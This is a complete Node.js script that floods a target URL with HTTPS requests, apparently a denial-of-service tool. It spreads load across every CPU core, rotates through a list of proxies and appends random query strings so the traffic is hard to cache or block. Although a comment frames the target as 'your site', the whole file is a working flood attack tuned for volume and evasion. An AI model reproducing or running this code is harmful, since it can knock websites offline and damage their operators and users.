const fs = require('fs');
const https = require('https');
const { Agent: HttpsProxyAgent } = require('https-proxy-agent');
const { cpus } = require('os');
const cluster = require('cluster');
const { randomBytes } = require('crypto');

const TARGET = 'https://your-domain.com'; // <-- Replace with your site
const PROXIES = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const CORES = cpus().length;
const INTERVAL = 5000;

if (cluster.isMaster) {
  for (let i = 0; i < CORES; i++) {
    cluster.fork();
  }
} else {
  let count = 0;
  let proxyIndex = 0;

  function getAgent() {
    const proxy = PROXIES[proxyIndex % PROXIES.length];
    proxyIndex++;
    return new HttpsProxyAgent('http://' + proxy);
  }

  let agent = getAgent();
  setInterval(() => { agent = getAgent(); }, INTERVAL); // Rotate proxy every 5s

  setInterval(() => {
    console.log(`(${count}) requests sent to (${TARGET}) in 5 seconds`);
    count = 0;
  }, INTERVAL);

  function fire() {
    const query = '?id=' + randomBytes(8).toString('hex');
    const req = https.get(TARGET + query, {
      agent,
      headers: {
        'User-Agent': 'ProxyFlood/1.0',
        'Accept': '*/*'
      },
      timeout: 1000
    });
    req.on('error', () => {});
    count++;
  }

  // Go nuts
  setInterval(() => {
    for (let i = 0; i < 500; i++) fire(); // You can crank this up
  }, 1);
}
